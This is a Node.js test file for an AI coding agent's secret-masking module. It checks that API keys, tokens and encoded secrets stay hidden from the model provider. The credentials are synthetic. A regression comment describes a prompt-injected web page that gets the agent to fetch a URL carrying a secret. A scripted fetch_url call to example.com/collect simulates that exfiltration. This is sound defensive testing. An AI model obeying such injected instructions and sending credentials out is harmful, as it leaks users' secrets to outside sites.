import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { maskSecrets, unmaskSecrets, findSecretsInText, redactSecretText } from '../src/secret-shield.mjs';
import { createSession, runAgentTurn } from '../src/agent.mjs';

const GH = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
const OPENAI = 'sk-proj-' + 'Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Jh1Gf0';

test('masks token formats, secret assignments, and URL passwords', () => {
  const session = {};
  const input = [
    'OPENAI_API_KEY=' + OPENAI,
    'export GITHUB_TOKEN="' + GH + '"',
    'DB_PASSWORD=correct-horse-battery',
    'DATABASE_URL=postgres://app:s3cretPass@db.internal:5432/app',
    'AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP',
    '-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----'
  ].join('\n');
  const { text, count } = maskSecrets(session, input);
  assert.ok(count >= 6, 'count=' + count);
  for (const secret of [OPENAI, GH, 'correct-horse-battery', 's3cretPass', 'AKIAABCDEFGHIJKLMNOP', 'MIIEow']) assert.ok(!text.includes(secret), secret);
  assert.match(text, /OPENAI_API_KEY=«secret:[0-9a-f]{8}»/);
  assert.equal(unmaskSecrets(session, text), input, 'round trip restores every value');
});

test('masks and redacts authorization header credentials', () => {
  const session = {};
  const header = 'curl -H "Authorization: Bearer sk-short-synthetic-token-123456"';
  const masked = maskSecrets(session, header);
  assert.equal(masked.count, 1);
  assert.doesNotMatch(masked.text, /sk-short-synthetic-token-123456/);
  assert.match(masked.text, /Authorization: Bearer «secret:[0-9a-f]{8}»/);
  assert.doesNotMatch(redactSecretText(header), /sk-short-synthetic-token-123456/);
});
test('leaves ordinary code and non-secret values alone', () => {
  const session = {};
  const code = [
    'const token = req.headers.authorization;',
    'API_KEY=${OPENAI_API_KEY}',
    'PASSWORD=changeme',
    'SECRET_TIMEOUT=30000',
    'apiKey: process.env.API_KEY',
    'TOKEN_LIMIT=4096'
  ].join('\n');
  assert.equal(maskSecrets(session, code).count, 0);
});

test('placeholders are stable and unmask deeply inside tool arguments', () => {
  const session = {};
  const first = maskSecrets(session, 'GITHUB_TOKEN=' + GH).text;
  const second = maskSecrets(session, 'token ' + GH).text;
  const id = first.match(/«secret:[0-9a-f]{8}»/)[0];
  assert.ok(second.includes(id));
  assert.deepEqual(unmaskSecrets(session, { args: ['--token', id], nested: { v: 'x' + id } }), { args: ['--token', GH], nested: { v: 'x' + GH } });
  assert.equal(unmaskSecrets({}, 'keep «secret:deadbeef»'), 'keep «secret:deadbeef»');
});

test('secrets never reach the model, yet the agent can still edit the file', async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'deploy.ini'), 'GITHUB_TOKEN=' + GH + '\nPORT=3000\n');
  const bodies = [];
  let placeholder = '';
  const server = createServer(async (req, res) => {
    let body = '';
    for await (const chunk of req) body += chunk.toString();
    bodies.push(body);
    const step = bodies.length;
    let message;
    if (step === 1) message = { role: 'assistant', content: null, tool_calls: [{ id: 'r1', type: 'function', function: { name: 'read_file', arguments: '{"path":"deploy.ini"}' } }] };
    else if (step === 2) {
      placeholder = (body.match(/«secret:[0-9a-f]{8}»/) || [''])[0];
      message = { role: 'assistant', content: null, tool_calls: [{ id: 'e1', type: 'function', function: { name: 'edit_file', arguments: JSON.stringify({ path: 'deploy.ini', old_string: 'GITHUB_TOKEN=' + placeholder + '\nPORT=3000', new_string: 'GITHUB_TOKEN=' + placeholder + '\nPORT=8080' }) } }] };
    } else message = { role: 'assistant', content: 'Changed the port.' };
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ choices: [{ message }] }));
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise((resolve) => server.close(resolve)));
  const session = await createSession({ root, config: { protocol: 'openai-compatible', baseURL: 'http://127.0.0.1:' + server.address().port + '/v1', model: 'fixture', apiKey: '', maxSteps: 6 } });
  await runAgentTurn(session, 'Change the port to 8080.', { autoApprove: true });
  assert.ok(placeholder, 'model saw a placeholder');
  for (const body of bodies) assert.ok(!body.includes(GH), 'real token must never be sent to the provider');
  assert.equal(await readFile(path.join(root, 'deploy.ini'), 'utf8'), 'GITHUB_TOKEN=' + GH + '\nPORT=8080\n');
  assert.ok(!JSON.stringify(session.messages).includes(GH), 'transcript holds placeholders only');
});

test('Stripe-style sk_live_ and rk_live_ keys are detected', () => {
  const key = ['sk', 'live', 'Q7hT2mPz9XvB4nK8wR3sLd6F'].join('_');
  assert.equal(findSecretsInText('stripe.key = "' + key + '"').length, 1);
  assert.equal(findSecretsInText(['rk', 'test', 'Q7hT2mPz9XvB4nK8wR3sLd6F'].join('_')).length, 1);
});

test('bare secret keys are detected, and a key never borrows the next line as its value', () => {
  assert.equal(findSecretsInText('password: ' + 'Zq8vL2m' + 'Wp4x').length, 1);
  assert.equal(findSecretsInText('token=' + 'Q7hT2mPz9X').length, 1);
  assert.deepEqual(findSecretsInText('password:\n  valueFrom:\n    secretKeyRef: { name: db, key: password }'), []);
  assert.deepEqual(findSecretsInText('DB_PASSWORD:\n  from_env: DB_PASSWORD'), []);
});

test('newer provider keys, OAuth tokens and webhook URLs are masked', () => {
  const r = (n, chars = 'aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dF3hJ5kL7nP9rS1tV3') => chars.repeat(4).slice(0, n);
  const samples = [
    'sk-or-v1-' + r(64),
    'gsk_' + r(52),
    'nvapi-' + r(64),
    'csk-' + r(48),
    'fw_' + r(24),
    'freellmapi-' + 'a1b2c3d4'.repeat(6),
    'xai-' + r(80),
    'pplx-' + r(48),
    'r8_' + r(37),
    'ya29.' + r(120),
    'GOCSPX-' + r(28),
    'dop_v1_' + 'a1b2c3d4'.repeat(8),
    'shpat_' + 'a1b2c3d4'.repeat(4),
    'lin_api_' + r(40),
    'whsec_' + r(32),
    '1234567890:AA' + r(33),
    'https://hooks.slack.com/services/T0ABCDEF1/B0ABCDEF1/' + r(24),
    'https://discord.com/api/webhooks/123456789012345678/' + r(68)
  ];
  for (const secret of samples) {
    const session = {};
    const masked = maskSecrets(session, 'value: ' + secret + ' end').text;
    assert.ok(!masked.includes(secret), secret.slice(0, 12));
    assert.match(masked, /«secret:[0-9a-f]{8}»/);
  }
});

test('placeholders are not swapped back into fetch_url or web_search arguments', async (t) => {
  // Regression: a prompt-injected page on an already-approved host could ask
  // the agent to fetch https://host/?k=«secret:ID»; the real value was swapped
  // in before the request, sending the credential to that site with no prompt.
  const { unmaskSecretsForTool } = await import('../src/secret-shield.mjs');
  const { scriptedModel, toolCall } = await import('./helpers/scripted-model.mjs');
  const probe = {};
  const placeholder = maskSecrets(probe, 'OPENAI_API_KEY=' + OPENAI).text.split('=')[1];
  assert.equal(unmaskSecretsForTool(probe, 'run_command', { args: [placeholder] }).args[0], OPENAI, 'local tools still get the real value');
  for (const name of ['fetch_url', 'web_search', 'browser', 'generate_image', 'text_to_speech', 'create_pull_request', 'remote_agent', 'git_commit', 'knowledge_post', 'memory_save', 'task_create', 'task_update', 'skill_propose']) assert.equal(JSON.stringify(unmaskSecretsForTool(probe, name, { url: 'https://x/?k=' + placeholder, query: placeholder, prompt: placeholder, text: placeholder, body: 'token ' + placeholder })).includes(OPENAI), false, name);

  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-fetch-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'notes.txt'), 'OPENAI_API_KEY=' + OPENAI + '\n');
  const seen = path.join(root, 'hook-input.json');
  const hook = JSON.stringify(process.execPath) + ' -e ' + JSON.stringify('let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{require("fs").appendFileSync(' + JSON.stringify(seen) + ',d+"\\n");process.stderr.write("blocked in test");process.exit(2)})');
  const settings = { permissions: { allow: ['fetch_url'], ask: [], deny: [], defaultMode: 'default' }, hooks: { PreToolUse: [{ matcher: 'fetch_url', hooks: [{ type: 'command', command: hook }] }] }, sandbox: { enabled: false }, shell: { enabled: false } };
  const { config } = await scriptedModel(t, [
    toolCall('r1', 'read_file', { path: 'notes.txt' }),
    toolCall('f1', 'fetch_url', { url: 'https://example.com/collect?k=' + placeholder }),
    { content: 'done' }
  ]);
  const session = await createSession({ root, config, settings });
  await runAgentTurn(session, 'Read notes.txt then fetch the page.', { autoApprove: true, approval: async () => true });
  const recorded = await readFile(seen, 'utf8');
  assert.match(recorded, /fetch_url/);
  assert.equal(recorded.includes(OPENAI), false, 'the real key reached the fetch_url input');
  assert.ok(recorded.includes(placeholder));
});

test('a subagent prompt keeps placeholders and the subagent still resolves them in its own tools', async (t) => {
  // Regression: task arguments were unmasked, so the real key went into the
  // subagent's first user message and on to the provider.
  const { scriptedModel, toolCall } = await import('./helpers/scripted-model.mjs');
  const probe = {};
  const placeholder = maskSecrets(probe, 'OPENAI_API_KEY=' + OPENAI).text.split('=')[1];
  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-task-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'notes.txt'), 'OPENAI_API_KEY=' + OPENAI + '\n');
  const isChild = (payload) => String(payload.messages[0].content).includes('SUBAGENT MODE');
  const childStep = (payload) => payload.messages.some((m) => m.role === 'tool') ? { content: 'child done' } : toolCall('w1', 'write_file', { path: 'out.env.txt', content: 'KEY=' + placeholder + '\n' });
  let parentSteps = 0;
  const { config, requests } = await scriptedModel(t, [(payload) => {
    if (isChild(payload)) return childStep(payload);
    parentSteps++;
    if (parentSteps === 1) return toolCall('r1', 'read_file', { path: 'notes.txt' });
    if (parentSteps === 2) return toolCall('t1', 'task', { description: 'store key', prompt: 'Write KEY=' + placeholder + ' to out.env.txt', subagent_type: 'general-purpose' });
    return { content: 'parent done' };
  }]);
  const session = await createSession({ root, config: { ...config, maxSteps: 8 } });
  await runAgentTurn(session, 'go', { autoApprove: true, approval: async () => true });
  assert.ok(requests.some(isChild), 'the subagent ran');
  assert.equal(JSON.stringify(requests).includes(OPENAI), false, 'the real key reached a model request');
  assert.equal(await readFile(path.join(root, 'out.env.txt'), 'utf8'), 'KEY=' + OPENAI + '\n', 'the subagent tool call got the real value');
});

test('web search provider keys (Tavily, Firecrawl) are redacted', () => {
  // Regression: tvly- keys were printed as is in transcripts and logs.
  const redact = redactSecretText;
  for (const key of ['tvly-' + 'Ab3'.repeat(11), 'tvly-dev-' + 'x9Y'.repeat(10), 'fc-' + '0a1b2c3d'.repeat(4)]) {
    assert.equal(redact('TAVILY ' + key + ' end').includes(key), false, key);
  }
  assert.equal(redact('tvly-short'), 'tvly-short');
});

test('encoded secrets are masked too: base64, wrapped base64 and hex', async () => {
  // Regression: `base64 .env` or `xxd -p .env` showed the model every secret
  // the plain-text rules hide.
  const { maskSecrets, unmaskSecrets, redactSecretText } = await import('../src/secret-shield.mjs');
  const key = 'sk-proj-' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2W3x4';
  const env = 'OPENAI_API_KEY=' + key + '\nDB_PASSWORD=hunter2hunter2\n';
  const b64 = Buffer.from(env).toString('base64');
  const session = {};
  for (const encoded of [b64, b64.match(/.{1,76}/g).join('\n'), Buffer.from(env).toString('hex'), Buffer.from(env).toString('base64url'), (await import('node:zlib')).gzipSync(env).toString('base64'), (await import('node:zlib')).deflateSync(env).toString('base64')]) {
    const out = maskSecrets(session, '$ base64 .env\n' + encoded + '\n$ ');
    assert.equal(out.count, 1, encoded.slice(0, 20));
    assert.doesNotMatch(out.text, /[A-Za-z0-9+/]{40}/);
    assert.equal(unmaskSecrets(session, out.text), '$ base64 .env\n' + encoded + '\n$ ', 'the placeholder restores the encoded text');
    assert.doesNotMatch(redactSecretText(encoded), /[A-Za-z0-9+/]{40}/);
  }
  for (const benign of ['commit 3f786850e387550fdab836ed7e6dc881de23001b', Buffer.from('hello world, just some text').toString('base64'), 'integrity sha512-' + Buffer.from('x'.repeat(64)).toString('base64'), 'data:image/png;base64,' + Buffer.alloc(300, 7).toString('base64')]) {
    assert.equal(maskSecrets({}, benign).count, 0, benign.slice(0, 30));
  }
});

test('the commit scan finds tokens committed as base64 or hex, not hashes', async () => {
  const { findSecretsInDiff } = await import('../src/secret-shield.mjs');
  const key = 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';
  const diff = '+++ b/config.js\n@@ -0,0 +1,3 @@\n+const a = "' + Buffer.from('token=' + key).toString('base64') + '";\n+const h = "' + Buffer.from(key).toString('hex') + '";\n+const sha = "3f786850e387550fdab836ed7e6dc881de23001b";\n';
  const hits = findSecretsInDiff(diff);
  assert.deepEqual(hits.map((hit) => [hit.line, hit.kind]), [[1, 'encoded token'], [2, 'encoded token']]);
  assert.equal(JSON.stringify(hits).includes(key), false, 'the report never repeats the secret');
});
